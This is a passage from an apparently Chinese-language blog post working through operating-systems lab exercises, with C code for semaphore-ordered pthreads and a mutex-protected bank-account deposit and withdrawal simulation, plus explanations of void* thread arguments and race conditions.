class="params">(<span class="type">void</span>*)</span>&#123;</span><br><span class="line">    sem_wait(&amp;sem_arr[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;is &quot;</span>);</span><br><span class="line">    sem_post(&amp;sem_arr[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span>* <span class="title function_">Func_3</span><span class="params">(<span class="type">void</span>*)</span>&#123;</span><br><span class="line">    sem_wait(&amp;sem_arr[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Jinan &quot;</span>);</span><br><span class="line">    sem_post(&amp;sem_arr[<span class="number">3</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span>* <span class="title function_">Func_4</span><span class="params">(<span class="type">void</span>*)</span>&#123;</span><br><span class="line">    sem_wait(&amp;sem_arr[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;University!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">pthread_t</span> threads[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">    sem_init(&amp;sem_arr[<span class="number">0</span>],<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">    sem_init(&amp;sem_arr[<span class="number">1</span>],<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    sem_init(&amp;sem_arr[<span class="number">2</span>],<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    sem_init(&amp;sem_arr[<span class="number">3</span>],<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;threads[<span class="number">0</span>],<span class="literal">NULL</span>,Func_1,<span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;threads[<span class="number">1</span>],<span class="literal">NULL</span>,Func_2,<span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;threads[<span class="number">2</span>],<span class="literal">NULL</span>,Func_3,<span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;threads[<span class="number">3</span>],<span class="literal">NULL</span>,Func_4,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">        pthread_join(threads[i],<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">        sem_destroy(&amp;sem_arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>              </div>            </details><p>运行结果如下图所示：</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20241010230244574.png" alt="image-20241010230244574" /></p><h3 id="q3"><a class="markdownIt-Anchor" href="#q3"></a> Q3</h3><blockquote><p>本题基于实验题目2。在主函数中依次启动四个线程，修改主程序，使得给定用户任意输入的整数n，程序输出n个同样的字符串“This is Jinan University!”</p></blockquote><p>一个很简单的基于（2）的变体。在（2）的基础上，只需要提前获取输入的n并且创建一个循环即可。需要注意的是，每次循环都要重新初始化信号量，保证线程之间的有序执行。</p><p>源代码如下：</p><details class="folding-tag" cyan><summary> 查看完整代码 </summary>              <div class='content'>              <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="type">sem_t</span> sem_arr[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">Func_1</span><span class="params">(<span class="type">void</span>*)</span>&#123;</span><br><span class="line">    sem_wait(&amp;sem_arr[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This &quot;</span>);</span><br><span class="line">    sem_post(&amp;sem_arr[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span>* <span class="title function_">Func_2</span><span class="params">(<span class="type">void</span>*)</span>&#123;</span><br><span class="line">    sem_wait(&amp;sem_arr[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;is &quot;</span>);</span><br><span class="line">    sem_post(&amp;sem_arr[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span>* <span class="title function_">Func_3</span><span class="params">(<span class="type">void</span>*)</span>&#123;</span><br><span class="line">    sem_wait(&amp;sem_arr[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Jinan &quot;</span>);</span><br><span class="line">    sem_post(&amp;sem_arr[<span class="number">3</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span>* <span class="title function_">Func_4</span><span class="params">(<span class="type">void</span>*)</span>&#123;</span><br><span class="line">    sem_wait(&amp;sem_arr[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;University!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">pthread_t</span> threads[<span class="number">4</span>];</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line"></span><br><span class="line">    sem_init(&amp;sem_arr[<span class="number">0</span>],<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">    sem_init(&amp;sem_arr[<span class="number">1</span>],<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    sem_init(&amp;sem_arr[<span class="number">2</span>],<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    sem_init(&amp;sem_arr[<span class="number">3</span>],<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter a number to loop execute threads\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (n--)&#123;</span><br><span class="line">        pthread_create(&amp;threads[<span class="number">0</span>],<span class="literal">NULL</span>,Func_1,<span class="literal">NULL</span>);</span><br><span class="line">        pthread_create(&amp;threads[<span class="number">1</span>],<span class="literal">NULL</span>,Func_2,<span class="literal">NULL</span>);</span><br><span class="line">        pthread_create(&amp;threads[<span class="number">2</span>],<span class="literal">NULL</span>,Func_3,<span class="literal">NULL</span>);</span><br><span class="line">        pthread_create(&amp;threads[<span class="number">3</span>],<span class="literal">NULL</span>,Func_4,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">            pthread_join(threads[i],<span class="literal">NULL</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        sem_init(&amp;sem_arr[<span class="number">0</span>],<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">        sem_init(&amp;sem_arr[<span class="number">1</span>],<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        sem_init(&amp;sem_arr[<span class="number">2</span>],<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        sem_init(&amp;sem_arr[<span class="number">3</span>],<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">        sem_destroy(&amp;sem_arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>              </div>            </details><p>运行结果如下图所示：</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20241010230257569.png" alt="image-20241010230257569" /></p><h2 id="lab02"><a class="markdownIt-Anchor" href="#lab02"></a> Lab02</h2><p>多线程是现代操作系统的核心概念，是能够保障操作系统正常运转的基础。Windows、Linux等操作系统向用户提供了多线程、信号量等函数接口，使用户可以通过C/C++、JAVA等主流编程语言来访问调用，以实现用户级线程的创建、运行、管理等功能。本次实验的目标如下：</p><ol><li>掌握Windows、Linux系统中多线程、信号量等的相关C函数使用；初步掌握多线程编程。</li><li>理解多线程的运行和调度原理；学会设计临界区/信号量来实现多个线程之间的互斥。</li></ol><h3 id="q1-2"><a class="markdownIt-Anchor" href="#q1-2"></a> Q1</h3><blockquote><p>Mary和Sally是亲姐妹，她们有一个共同的银行账户，她们可以分别到ATM机取款；爸爸，妈妈，奶奶，爷爷，舅舅也可以分别到ATM机给银行账户存钱。设账户的初始余额为10元。爸爸，妈妈，奶奶，爷爷，舅舅每次分别存入10，20，30，40，50元，每个人分别存款2次。Mary和Sally每次分别取50和100元，每个人分别取款2次。存款和取款的顺序是随机的。假设Mary和Sally的银行账户是可借记的，即当余额少于取款额时，仍旧能够取款成功。利用临界区(Windows系统)或者mutex信号量(Linux系统)编制程序来模拟上述存取款过程，在主程序结束时将账户的最后余额输出，并人工验证一下是否正确。</p><p>实验要求：只能建立一个存款函数Deposit()和一个取款函数Withdraw()；每个家长在每次存款时都要创建1个存款线程，以Deposit()作为线程函数，将家长的称呼和存款金额传递给存款线程，以完成存款操作。同样的，Mary和Sally每人每次在取款时都要创建1个取款线程，以Withdraw()作为线程函数，将取款人的称呼和取款金额传递给取款线程，以完成取款操作。假设Mary和Sally的银行账户是可借记的，即当余额少于取款额时，仍旧能够取款成功。</p><p>实验提示：用srand()来设定随机数种子；用rand()函数来产生每次存款/取款的家长/取款人。定义一个结构体数组，用来保存每个存款/取款人的称呼和存款/取款金额，然后在创建线程时将相应的结构体作为参数传递给线程。</p><p>银行账户是公共变量，对它的操作需要用临界区来进行保护。</p></blockquote><p>本题的重点在于临界区保护，也就是说要用到临界区/互斥锁。可以大致把本体分为三个部分实现：</p><ol><li>实现线程函数Deposit和Withdraw</li><li>随机生成操作人员对银行账户进行操作</li><li>向对应的线程函数传递操作人员的信息</li></ol><h4 id="实现线程函数"><a class="markdownIt-Anchor" href="#实现线程函数"></a> 实现线程函数</h4><p>两个函数的实现逻辑不难。注意银行帐户是共享变量，在多线程并发操作时必须要加锁来避免条件竞争。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span>* <span class="title function_">Deposit</span><span class="params">(<span class="type">void</span>* arg)</span> &#123;</span><br><span class="line">    <span class="comment">// 存款线程，传入参数为操作人员，在对银行账户进行操作时加锁</span></span><br><span class="line">    Member* operator = (Member*)arg;</span><br><span class="line"></span><br><span class="line">    pthread_mutex_lock(&amp;Lock);</span><br><span class="line">    bank_account += operator-&gt;op_amount;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s deposited %d, now the bank account has %d\n&quot;</span>,</span><br><span class="line">           operator-&gt;name, operator-&gt;op_amount, bank_account);</span><br><span class="line">    pthread_mutex_unlock(&amp;Lock);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//释放操作人员指向的姓名和本身的内存空间</span></span><br><span class="line">    <span class="built_in">free</span>(operator-&gt;name);</span><br><span class="line">    <span class="built_in">free</span>(operator);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="随机生成操作人员"><a class="markdownIt-Anchor" href="#随机生成操作人员"></a> 随机生成操作人员</h4><p>用<code>rand()</code>函数生成随机数，同时限定每一个随机数的出现次数，因为每个家庭成员只有两次操作机会。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (operate_num &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 保证启动操作数量个线程</span></span><br><span class="line">        <span class="comment">// 取随机数生成随机的操作人员，如果该人员的操作次数已经用尽，就跳过该人员</span></span><br><span class="line">        <span class="type">int</span> rand_guy = rand() % num;</span><br><span class="line">        <span class="keyword">if</span> (members[rand_guy].op_times == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        members[rand_guy].op_times--;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里我们给操作人员一个<code>op_times</code>属性，代表该家庭成员剩余的操作次数，当操作次数为0时代表该家庭成员已经没有操作机会。所以在对操作人员进一步操作时需要先检查该成员是否还有操作机会，如果没有机会就跳过后续操作随机生成下一个操作人员。</p><p>操作人员的身份（rand_guy）确定后，需要对预备传递给线程的操作人员信息进行填充，于是编写一个<code>load_operator()</code>函数进行处理。这里主要是填充操作人员的姓名、存取款状态、操作钱款。</p><p>注意为operator填充姓名时并没有直接指向家庭成员的姓名，而是用<span class="bubble-content">strdup函数</span><span class="bubble-notation"><span class="bubble-item" style="background-color:#ec5830;">strdup( ) 函数是c语言中常用的一种字符串拷贝库函数，一般和 free( ) 函数成对出现。</span></span>拷贝了一份家庭成员姓名字符串。后续需要用<code>free()</code>释放掉姓名空间。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">load_operator</span><span class="params">(Member* rand_operator, <span class="type">int</span> rand_guy)</span> &#123; </span><br><span class="line">    <span class="comment">//处理向线程发送的数据，即填充操作人员的姓名、存取款状态、操作钱款</span></span><br><span class="line">    rand_operator-&gt;name = strdup(members[rand_guy].name); <span class="comment">// 填充操作人员的姓名</span></span><br><span class="line">    <span class="keyword">if</span> (rand_operator-&gt;name == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;strdup failed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (rand_guy &lt;= <span class="number">4</span>) &#123; <span class="comment">// 根据随机到的人员编号判断该成员是存款还是取款</span></span><br><span class="line">        rand_operator-&gt;is_withdraw = <span class="number">0</span>;</span><br><span class="line">        rand_operator-&gt;op_amount = deposit_num[rand_guy]; <span class="comment">// 操作钱款对应操作人员的编号</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        rand_operator-&gt;is_withdraw = <span class="number">1</span>;</span><br><span class="line">        rand_operator-&gt;op_amount = withdraw_num[rand_guy - <span class="number">5</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="向线程函数传递操作人员信息"><a class="markdownIt-Anchor" href="#向线程函数传递操作人员信息"></a> 向线程函数传递操作人员信息</h4><p>首先要判断操作成员是取款还是存款，接着传递操作人员的信息给对应的线程函数。注意线程函数只能接受指针作为传入参数，在线程开始时会去读取指针指向地址的数据。所以需要为传递的操作人员动态分配一片内存空间。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Member* operator = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Member));</span><br><span class="line">        <span class="keyword">if</span> (operator == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;malloc failed for operator&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        load_operator(operator, rand_guy); <span class="comment">// 装载操作人员的信息</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (operator-&gt;is_withdraw) &#123; <span class="comment">// 根据操作人员的信息决定调用存款还是取款线程</span></span><br><span class="line">            pthread_create(&amp;threads[thread_index++], <span class="literal">NULL</span>, Withdraw, operator);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            pthread_create(&amp;threads[thread_index++], <span class="literal">NULL</span>, Deposit, operator);</span><br><span class="line">        &#125;</span><br><span class="line">        operate_num--;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里说一下线程函数的传递参数机制。线程函数的定义是：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> * <span class="title function_">myFunc</span><span class="params">(<span class="type">void</span> *)</span></span><br><span class="line">&#123;</span><br><span class="line">   my code here to <span class="keyword">do</span> something…</span><br><span class="line">   <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到线程函数的接收值和返回值都是<code>void*</code>类型，即空指针类型。pthread调用的函数要求入参是一个<code>void*</code>的指针，必须将数据强转成这个指针用来传递参数。在函数内部，必须要再手动转换回原来的参数类型来使用这个参数。这种做法叫做<span class='p yellow'>类型擦除</span>，跟go的interface{}有着异曲同工之妙，C的泛型编程基本上都是用的<code>void*</code>这样的方法来传递参数。</p><p>所以我们在线程函数调用时传递了operator的操作人员信息后，在线程函数内部要手动将指针转换回它的数据类型：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span>* <span class="title function_">Deposit</span><span class="params">(<span class="type">void</span>* arg)</span> &#123;</span><br><span class="line">    <span class="comment">// 存款线程，传入参数为操作人员，在对银行账户进行操作时加锁</span></span><br><span class="line">    Member* operator = (Member*)arg;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至于为什么要为operator动态分配内存而不使用临时变量，是因为对临时变量的值的更新只是在同一片内存空间的位置上进行迭代。这样调用线程函数时传递的指针指向的都是同一片空间，多线程读取操作人员信息时就会出现<span class='p red'>条件竞争</span>。所以必须使用动态内存分配来存储操作人员信息，并在线程内对操作人员的内存空间进行释放。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span>* <span class="title function_">Deposit</span><span class="params">(<span class="type">void</span>* arg)</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//释放操作人员指向的姓名和本身的内存空间</span></span><br><span class="line">    <span class="built_in">free</span>(operator-&gt;name);</span><br><span class="line">    <span class="built_in">free</span>(operator);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完整的代码如下：</p><details class="folding-tag" cyan><summary> 查看完整代码 </summary>              <div class='content'>              <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">char</span>* name; <span class="comment">// 家庭成员姓名</span></span><br><span class="line">    <span class="type">int</span> op_amount; <span class="comment">// 操作人员操作的钱款</span></span><br><span class="line">    <span class="type">int</span> op_times; <span class="comment">// 剩余的操作次数，每人默认2次</span></span><br><span class="line">    <span class="type">int</span> is_withdraw; <span class="comment">// 1代表为退款操作，0是储蓄操作</span></span><br><span class="line">&#125; Member;</span><br><span class="line"></span><br><span class="line">Member members[] = &#123;</span><br><span class="line">    &#123;<span class="string">&quot;Dad&quot;</span>, <span class="number">0</span>, <span class="number">2</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;Mom&quot;</span>, <span class="number">0</span>, <span class="number">2</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;Grandma&quot;</span>, <span class="number">0</span>, <span class="number">2</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;Grandpa&quot;</span>, <span class="number">0</span>, <span class="number">2</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;Uncle&quot;</span>, <span class="number">0</span>, <span class="number">2</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;Mary&quot;</span>, <span class="number">0</span>, <span class="number">2</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;Sally&quot;</span>, <span class="number">0</span>, <span class="number">2</span>&#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> deposit_num[] = &#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">50</span>&#125;;</span><br><span class="line"><span class="type">int</span> withdraw_num[] = &#123;<span class="number">50</span>, <span class="number">100</span>&#125;;</span><br><span class="line"><span class="type">int</span> bank_account = <span class="number">10</span>;</span><br><span class="line"><span class="type">pthread_mutex_t</span> Lock;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">Deposit</span><span class="params">(<span class="type">void</span>* arg)</span> &#123;</span><br><span class="line">    <span class="comment">// 存款线程，传入参数为操作人员，在对银行账户进行操作时加锁</span></span><br><span class="line">    Member* operator = (Member*)arg;</span><br><span class="line"></span><br><span class="line">    pthread_mutex_lock(&amp;Lock);</span><br><span class="line">    bank_account += operator-&gt;op_amount;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s deposited %d, now the bank account has %d\n&quot;</span>,</span><br><span class="line">           operator-&gt;name, operator-&gt;op_amount, bank_account);</span><br><span class="line">    pthread_mutex_unlock(&amp;Lock);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//释放操作人员指向的姓名和本身的内存空间</span></span><br><span class="line">    <span class="built_in">free</span>(operator-&gt;name);</span><br><span class="line">    <span class="built_in">free</span>(operator);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">Withdraw</span><span class="params">(<span class="type">void</span>* arg)</span> &#123;</span><br><span class="line">    <span class="comment">// 取款线程，传入参数为操作人员，在对银行账户进行操作时加锁</span></span><br><span class="line">    Member* operator = (Member*)arg;</span><br><span class="line"></span><br><span class="line">    pthread_mutex_lock(&amp;Lock);</span><br><span class="line">    bank_account -= operator-&gt;op_amount;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s withdrew %d, now the bank account has %d\n&quot;</span>,</span><br><span class="line">           operator-&gt;name, operator-&gt;op_amount, bank_account);</span><br><span class="line">    pthread_mutex_unlock(&amp;Lock);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//释放操作人员指向的姓名和本身的内存空间</span></span><br><span class="line">    <span class="built_in">free</span>(operator-&gt;name);</span><br><span class="line">    <span class="built_in">free</span>(operator);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">load_operator</span><span class="params">(Member* rand_operator, <span class="type">int</span> rand_guy)</span> &#123; </span><br><span class="line">    <span class="comment">//处理向线程发送的数据，即填充操作人员的姓名、存取款状态、操作钱款</span></span><br><span class="line">    rand_operator-&gt;name = strdup(members[rand_guy].name); <span class="comment">// 填充操作人员的姓名</span></span><br><span class="line">    <span class="keyword">if</span> (rand_operator-&gt;name == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;strdup failed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (rand_guy &lt;= <span class="number">4</span>) &#123; <span class="comment">// 根据随机到的人员编号判断该成员是存款还是取款</span></span><br><span class="line">        rand_operator-&gt;is_withdraw = <span class="number">0</span>;</span><br><span class="line">        rand_operator-&gt;op_amount = deposit_num[rand_guy]; <span class="comment">// 操作钱款对应操作人员的编号</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        rand_operator-&gt;is_withdraw = <span class="number">1</span>;</span><br><span class="line">        rand_operator-&gt;op_amount = withdraw_num[rand_guy - <span class="number">5</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">operate</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="comment">// 操作主体函数，处理随机存取逻辑并启动多线程</span></span><br><span class="line">    <span class="type">int</span> num = <span class="keyword">sizeof</span>(members) / <span class="keyword">sizeof</span>(members[<span class="number">0</span>]); <span class="comment">//成员数量</span></span><br><span class="line">    <span class="type">int</span> operate_num = <span class="number">0</span>; <span class="comment">// 操作次数，即存取款次数之和，本体应为2*7=14</span></span><br><span class="line">    <span class="type">int</span> thread_index = <span class="number">0</span>; <span class="comment">// 线程计数下标</span></span><br><span class="line">    srand((<span class="type">unsigned</span> <span class="type">int</span>)time(<span class="literal">NULL</span>)); <span class="comment">// 初始化随机数种子</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; num; i++) &#123;</span><br><span class="line">        <span class="comment">// 计算操作次数</span></span><br><span class="line">        operate_num += members[i].op_times;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">pthread_t</span>* threads = <span class="built_in">malloc</span>(operate_num * <span class="keyword">sizeof</span>(<span class="type">pthread_t</span>)); <span class="comment">// 为操作总数动态分配相同个数的线程</span></span><br><span class="line">    <span class="keyword">if</span> (threads == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;malloc failed for threads&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (operate_num &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 保证启动操作数量个线程</span></span><br><span class="line">        <span class="comment">// 取随机数生成随机的操作人员，如果该人员的操作次数已经用尽，就跳过该人员</span></span><br><span class="line">        <span class="type">int</span> rand_guy = rand() % num;</span><br><span class="line">        <span class="keyword">if</span> (members[rand_guy].op_times == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        members[rand_guy].op_times--;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        因为向线程传递的参数必须是一个指向特定地址的指针，线程启动后将向该地址读取数据</span></span><br><span class="line"><span class="comment">        所以必须用动态内存分配一个新的内存空间储存操作人员信息，并将该指针传递给线程</span></span><br><span class="line"><span class="comment">        如果用临时变量，操作人员的信息将只在一片相同的地址空间上进行迭代</span></span><br><span class="line"><span class="comment">        多线程读取数据时就会出现条件竞争</span></span><br><span class="line"><span class="comment">        故而此处必须使用动态内存分配，并在线程操作执行结束时由线程对分配的内存进行释放</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        Member* operator = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Member));</span><br><span class="line">        <span class="keyword">if</span> (operator == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;malloc failed for operator&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        load_operator(operator, rand_guy); <span class="comment">// 装载操作人员的信息</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (operator-&gt;is_withdraw) &#123; <span class="comment">// 根据操作人员的信息决定调用存款还是取款线程</span></span><br><span class="line">            pthread_create(&amp;threads[thread_index++], <span class="literal">NULL</span>, Withdraw, operator);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            pthread_create(&amp;threads[thread_index++], <span class="literal">NULL</span>, Deposit, operator);</span><br><span class="line">        &#125;</span><br><span class="line">        operate_num--;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; thread_index; i++) &#123; <span class="comment">// 在多线程并发结束后等待多线程结束</span></span><br><span class="line">        pthread_join(threads[i], <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(threads); <span class="comment">// 操作结束，释放对线程分配的内存</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title 